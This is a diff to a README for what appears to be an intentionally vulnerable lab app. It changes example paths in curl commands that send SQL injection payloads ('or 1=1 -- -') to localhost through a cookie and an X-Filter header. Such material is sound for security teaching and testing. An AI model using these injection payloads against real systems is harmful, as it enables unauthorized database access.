@@ -32,8 +32,8 @@ curl http://localhost:8080/vun/sql/example4/ --cookie "name=michal'%20or%201=1%2
 
 ### GET request - payload in header
 ```bash
-curl http://localhost:8080/vun/sql/example5/ -H "X-Filter:michal"
-curl http://localhost:8080/vun/sql/example5/ -H "X-Filter:michal' or 1=1 -- -"
+curl http://localhost:8080/vun/sql/example5/1/ -H "X-Filter:michal"
+curl http://localhost:8080/vun/sql/example5/1/ -H "X-Filter:michal' or 1=1 -- -"
 ```
 
 ### POST request - payload in xml body
